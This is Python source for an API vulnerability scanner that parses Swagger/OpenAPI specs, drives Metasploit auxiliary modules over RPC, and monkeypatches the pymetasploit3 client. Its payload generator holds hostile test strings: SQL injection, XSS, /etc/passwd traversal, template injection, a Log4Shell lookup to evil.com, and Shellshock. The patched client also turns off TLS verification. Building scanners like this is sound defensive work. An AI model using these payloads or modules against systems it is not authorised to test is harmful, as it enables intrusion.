import pymetasploit3.msfrpc as msfrpc
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Store original __init__
_original_init = msfrpc.MsfRpcClient.__init__


def _fixed_init(self, password, **kwargs):
    """Complete fix for Metasploit Docker connectivity"""
    # Get the actual server (default to 'metasploit' for Docker)
    server = kwargs.get("server", "metasploit")
    port = kwargs.get("port", 55553)

    # Force the server to be used
    kwargs["server"] = server

    # Call original init
    _original_init(self, password, **kwargs)

    # COMPLETELY rebuild the client with proper URL and session
    self.host = server
    self.port = port
    self.ssl = kwargs.get("ssl", False)

    # Set the correct URI
    if self.ssl:
        self.uri = f"https://{server}:{port}/api/"
    else:
        self.uri = f"http://{server}:{port}/api/"

    # Create a proper session with retries
    self.session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    self.session.mount("http://", adapter)
    self.session.mount("https://", adapter)

    # Set headers
    self.headers = {"Content-type": "binary/message-pack"}


# Replace the post_request method to use our fixed URI
def _fixed_post_request(self, url, payload):
    """Fix the relative URL issue and use correct session"""
    # If URL is relative, use our full URI
    if url.startswith("/"):
        target_url = self.uri
    else:
        target_url = url

    # Debug: print available session attributes
    print(f"🔧 DEBUG - Available session attributes:")
    for attr in dir(self):
        if "session" in attr.lower():
            print(f"  - {attr}: {type(getattr(self, attr))}")

    # Try to find the correct session object
    if hasattr(self, "session") and hasattr(self.session, "post"):
        session_obj = self.session
    elif hasattr(self, "_session") and hasattr(self._session, "post"):
        session_obj = self._session
    else:
        # Fallback: create new session
        import requests

        session_obj = requests.Session()
        self.session = session_obj

    return session_obj.post(
        target_url, data=payload, headers=self.headers, verify=False
    )


msfrpc.MsfRpcClient.__init__ = _fixed_init
msfrpc.MsfRpcClient.post_request = _fixed_post_request


# base.py
import json
import time
import requests
import yaml
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse
from pymetasploit3.msfrpc import MsfRpcClient
import re

from environmentals import (
    METASPLOIT_HOST,
    METASPLOIT_PASSWORD,
    METASPLOIT_USERNAME,
    METASPLOIT_PORT,
)
from logger import logger


class ScanConfig:
    """Configuration for API scanning"""

    def __init__(
        self,
        target_url: str,
        swagger_url: Optional[str] = None,
        scan_types: List[str] = None,
        user_id: Optional[str] = None,
        metasploit_config: Dict = None,
    ):
        self.target_url = target_url.rstrip("/")
        self.swagger_url = swagger_url
        self.scan_types = scan_types or [
            "cors",
            "sql_injection",
            "xss",
            "csrf",
            "rate_limiting",
            "broken_authentication",
            "directory_traversal",
            "information_disclosure",
            "http_methods",
            "server_info",
            "backup_files",
        ]
        self.user_id = user_id
        self.timeout = 30
        self.threads = 3
        self.metasploit_config = metasploit_config or {
            "host": METASPLOIT_HOST,
            "port": METASPLOIT_PORT,
            "username": METASPLOIT_USERNAME,
            "password": METASPLOIT_PASSWORD,
        }


class SwaggerValidator:
    """Validates and parses Swagger/OpenAPI documentation"""

    def __init__(self, swagger_url: str):
        self.swagger_url = swagger_url
        self.swagger_data = None
        self.endpoints = []
        self.is_valid = False

    def validate_and_parse(self) -> Tuple[bool, str, List[Dict]]:
        """Validate Swagger/OpenAPI doc and extract endpoints"""
        try:
            # Fetch the documentation
            response = requests.get(self.swagger_url, timeout=10)
            if response.status_code != 200:
                return (
                    False,
                    f"HTTP {response.status_code}: Cannot fetch documentation",
                    [],
                )

            # Parse content
            content = response.text
            try:
                self.swagger_data = json.loads(content)
            except json.JSONDecodeError:
                try:
                    self.swagger_data = yaml.safe_load(content)
                except yaml.YAMLError:
                    return False, "Documentation is neither valid JSON nor YAML", []

            # Validate OpenAPI structure
            if not self._validate_openapi_spec():
                return False, "Invalid OpenAPI specification", []

            # Extract endpoints with parameters
            self.endpoints = self._extract_endpoints_with_parameters()
            self.is_valid = True

            return True, "Valid OpenAPI documentation", self.endpoints

        except Exception as e:
            return False, f"Validation error: {str(e)}", []

    def _validate_openapi_spec(self) -> bool:
        """Validate OpenAPI specification"""
        if not isinstance(self.swagger_data, dict):
            return False

        # Check for OpenAPI 3.x
        if "openapi" in self.swagger_data and self.swagger_data["openapi"].startswith(
            "3."
        ):
            required_fields = ["openapi", "info", "paths"]
            return all(field in self.swagger_data for field in required_fields)

        # Check for Swagger 2.0
        elif "swagger" in self.swagger_data and self.swagger_data["swagger"] == "2.0":
            required_fields = ["swagger", "info", "paths"]
            return all(field in self.swagger_data for field in required_fields)

        return False

    def _extract_endpoints_with_parameters(self) -> List[Dict]:
        """Extract endpoints with detailed parameter information"""
        endpoints = []

        if "paths" not in self.swagger_data:
            return endpoints

        for path, methods in self.swagger_data["paths"].items():
            for method, details in methods.items():
                if method.upper() in [
                    "GET",
                    "POST",
                    "PUT",
                    "DELETE",
                    "PATCH",
                    "HEAD",
                    "OPTIONS",
                ]:
                    endpoint = {
                        "path": path,
                        "method": method.upper(),
                        "parameters": self._extract_parameters(details),
                        "request_body": self._extract_request_body(details),
                        "summary": details.get("summary", ""),
                        "description": details.get("description", ""),
                        "operation_id": details.get("operationId", ""),
                        "tags": details.get("tags", []),
                        "requires_auth": self._requires_authentication(details),
                        "consumes": details.get("consumes", ["application/json"]),
                        "produces": details.get("produces", ["application/json"]),
                    }
                    endpoints.append(endpoint)

        return endpoints

    def _extract_parameters(self, endpoint_details: Dict) -> List[Dict]:
        """Extract detailed parameter information"""
        parameters = []

        for param in endpoint_details.get("parameters", []):
            param_info = {
                "name": param.get("name", ""),
                "in": param.get("in", ""),  # query, path, header, cookie
                "type": param.get("schema", {}).get(
                    "type", param.get("type", "string")
                ),
                "format": param.get("schema", {}).get(
                    "format", param.get("format", "")
                ),
                "required": param.get("required", False),
                "description": param.get("description", ""),
                "enum": param.get("schema", {}).get("enum", param.get("enum", [])),
                "default": param.get("schema", {}).get("default", param.get("default")),
                "min_length": param.get("schema", {}).get(
                    "minLength", param.get("minLength")
                ),
                "max_length": param.get("schema", {}).get(
                    "maxLength", param.get("maxLength")
                ),
                "pattern": param.get("schema", {}).get("pattern", param.get("pattern")),
            }

            # Handle OpenAPI 3.x schema
            if "schema" in param and isinstance(param["schema"], dict):
                schema = param["schema"]
                if "properties" in schema:
                    param_info["properties"] = schema["properties"]
                if "items" in schema:
                    param_info["items"] = schema["items"]

            parameters.append(param_info)

        return parameters

    def _extract_request_body(self, endpoint_details: Dict) -> Dict:
        """Extract request body schema"""
        request_body = {}

        if "requestBody" in endpoint_details:
            body_content = endpoint_details["requestBody"].get("content", {})
            for content_type, media_type in body_content.items():
                if "schema" in media_type:
                    schema = media_type["schema"]
                    request_body = {
                        "content_type": content_type,
                        "schema": schema,
                        "required": endpoint_details["requestBody"].get(
                            "required", False
                        ),
                    }
                    break

        return request_body

    def _requires_authentication(self, endpoint_details: Dict) -> bool:
        """Check if endpoint requires authentication"""
        return "security" in endpoint_details or bool(
            endpoint_details.get("security", [])
        )


class BaseScanner(ABC):
    """Abstract base class for all scanners"""

    def __init__(self, config: ScanConfig, endpoints: List[Dict] = None):
        self.config = config
        self.endpoints = endpoints or []
        self.vulnerabilities = []
        self.msf_client = None

        # Initialize Metasploit client if configured
        if hasattr(config, "metasploit_config"):
            try:
                self.msf_client = MsfRpcClient(
                    config.metasploit_config["password"],
                    port=config.metasploit_config["port"],
                    username=config.metasploit_config["username"],
                )
            except Exception as e:
                logger.exception(f"Metasploit client initialization failed: {e}")

    @abstractmethod
    def scan(self) -> Dict[str, Any]:
        """Perform the security scan"""
        pass

    def analyze_severity(self, finding: Dict) -> str:
        """Analyze and assign severity to findings"""
        impact = finding.get("impact", "low")
        confidence = finding.get("confidence", "medium")

        if impact == "critical" and confidence in ["high", "medium"]:
            return "critical"
        elif impact == "high" and confidence in ["high", "medium"]:
            return "high"
        elif impact == "medium" and confidence in ["high", "medium"]:
            return "medium"
        else:
            return "low"

    def save_finding(
        self,
        vulnerability_type: str,
        description: str,
        evidence: str,
        endpoint: Optional[Dict] = None,
        impact: str = "low",
        confidence: str = "medium",
    ) -> None:
        """Save a vulnerability finding"""
        severity = self.analyze_severity({"impact": impact, "confidence": confidence})

        finding = {
            "type": vulnerability_type,
            "description": description,
            "evidence": evidence,
            "endpoint": endpoint,
            "impact": impact,
            "confidence": confidence,
            "severity": severity,
            "timestamp": time.time(),
        }

        self.vulnerabilities.append(finding)

    def get_scan_results(self) -> Dict[str, Any]:
        """Get formatted scan results"""
        critical = len([v for v in self.vulnerabilities if v["severity"] == "critical"])
        high = len([v for v in self.vulnerabilities if v["severity"] == "high"])
        medium = len([v for v in self.vulnerabilities if v["severity"] == "medium"])
        low = len([v for v in self.vulnerabilities if v["severity"] == "low"])

        # Calculate security score (0-100, higher is better)
        security_score = max(
            0, 100 - (critical * 20 + high * 10 + medium * 5 + low * 1)
        )

        return {
            "vulnerabilities": self.vulnerabilities,
            "total_vulnerabilities": len(self.vulnerabilities),
            "critical_count": critical,
            "high_count": high,
            "medium_count": medium,
            "low_count": low,
            "security_score": security_score,
        }

    def run_metasploit_module(
        self, module_name: str, target_url: str, options: Dict = None
    ) -> Dict:
        """Run a Metasploit module and return results"""
        if not self.msf_client:
            return {"error": "Metasploit client not available"}

        try:
            # Use the module
            module = self.msf_client.modules.use("auxiliary", module_name)

            # Set basic options
            parsed_url = urlparse(target_url)
            module["RHOSTS"] = parsed_url.hostname
            module["RPORT"] = parsed_url.port or (
                443 if parsed_url.scheme == "https" else 80
            )
            module["TARGETURI"] = parsed_url.path or "/"
            module["THREADS"] = self.config.threads
            module["VERBOSE"] = True

            # Set custom options
            if options:
                for key, value in options.items():
                    module[key] = value

            # Execute the module
            result = module.execute()

            return {
                "success": True,
                "job_id": result.get("job_id"),
                "module": module_name,
                "target": target_url,
            }

        except Exception as e:
            return {"error": f"Metasploit module execution failed: {str(e)}"}

    def generate_test_payloads(self, parameter: Dict) -> List[Any]:
        """Generate test payloads based on parameter type and constraints"""
        payloads = []

        param_type = parameter.get("type", "string")
        param_format = parameter.get("format", "")
        param_enum = parameter.get("enum", [])

        # If enum is defined, use those values
        if param_enum:
            return param_enum[:5]  # Use first 5 enum values

        # Generate payloads based on type
        if param_type == "string":
            base_payloads = ["test", "admin", "1", "true", "false", "null", ""]

            # Add type-specific payloads
            if param_format == "email":
                base_payloads.extend(["test@example.com", "admin@admin.com"])
            elif param_format == "uuid":
                base_payloads.extend(["123e4567-e89b-12d3-a456-426614174000"])
            elif param_format == "date":
                base_payloads.extend(["2023-01-01", "1970-01-01"])

            # Add security test payloads
            security_payloads = [
                "' OR '1'='1",
                "<script>alert(1)</script>",
                "../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com}",
                "() { :;}; echo vulnerable",
            ]

            payloads = base_payloads + security_payloads

        elif param_type == "integer":
            payloads = [1, 0, -1, 999999, -999999, "1", "0"]

        elif param_type == "boolean":
            payloads = [True, False, "true", "false", "1", "0"]

        elif param_type == "array":
            payloads = [[], ["test"], [1, 2, 3], ["a", "b", "c"]]

        else:
            payloads = ["test", 1, True, None, ""]

        return payloads[:10]  # Limit to 10 payloads per parameter
